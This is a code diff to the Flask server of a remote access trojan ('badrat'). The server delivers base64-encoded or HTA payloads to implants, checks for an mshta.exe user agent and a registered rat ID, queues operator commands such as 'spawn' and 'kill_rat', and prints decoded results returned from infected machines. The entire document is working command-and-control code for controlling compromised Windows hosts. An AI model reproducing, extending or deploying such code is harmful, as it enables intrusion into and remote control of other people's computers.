@@ -90,18 +90,16 @@ def default_page():
     return(htmlify(message))
 
 # Allow rats to call home and request more ratcode of their own type
-def send_ratcode(ratID="", ratType=""):
-    if(ratType):
-        with open(os.getcwd() + "/rats/badrat." + ratType, 'r') as fd:
-            if(ratID):
-                print("\n[*] sending " + colors(ratType) + " ratcode to " + colors(ratID))
-            else:
-                print("\n[*] sending ratcode to " + colors(ratType) + " rat")
-            return(fd.read())
-    elif(ratID):
-        with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
-            print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
-            return(fd.read())
+def send_ratcode(ratID):
+    print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
+    with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
+        ratcode = fd.read()
+        if(types[ratID] == "hta"):
+            return(ratcode)
+        else:
+            ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
+            print("Returing ratcode: "+ratcode)
+            return(ratcode)
 
 def serve_server(port=8080):
     app = Flask(__name__)
@@ -114,9 +112,10 @@ def serve_server(port=8080):
     @app.route('/<path:path>', methods=['GET'])
     def badrat_get(path):
         user_agent = request.headers['User-Agent']
-        # Path must be /r/b.hta AND user agent belongs to mshta.exe
-        if(path == "r/b.hta" and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent):
-            return(send_ratcode(ratType="hta"))
+        # Path must be /<ratID>/r/b.hta AND user agent belongs to mshta.exe
+        if("/r/b.hta" in path and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent and path.split("/")[0] in rats.keys()):
+            ratID = path.split("/")[0]
+            return(send_ratcode(ratID))
         else:
             print("[!] GET request from non-rat client requested path /" + path)
             return(default_page())
@@ -150,13 +149,8 @@ def serve_server(port=8080):
 
         if("retval" in post_dict.keys()):
             commands[ratID] = ""
-            print("\n[*] Results from rat " + colors(str(post_dict['id'])) + "\n")
+            print("\n[*] Results from rat " + colors(str(post_dict['id'])) + ":\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
-
-        # Spawn from HTTP page
-        if("req" in post_dict.keys() and str.startswith(post_dict['req'], "spawn ")):
-            spawnType =  post_dict['req'].split(" ")[1]
-            return(send_ratcode(ratID=ratID,ratType=spawnType))
 
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
@@ -273,6 +267,11 @@ if __name__ == "__main__":
                     if(inp == "quit" or inp == "kill_rat"):
                         print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
                         inp = "quit"
+                    elif(inp == "spawn"):
+                        if(types[ratID] == "hta"):
+                            inp = "spawn"
+                        else:
+                            inp = "spawn " + send_ratcode(ratID)
                     else:
                         print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
 
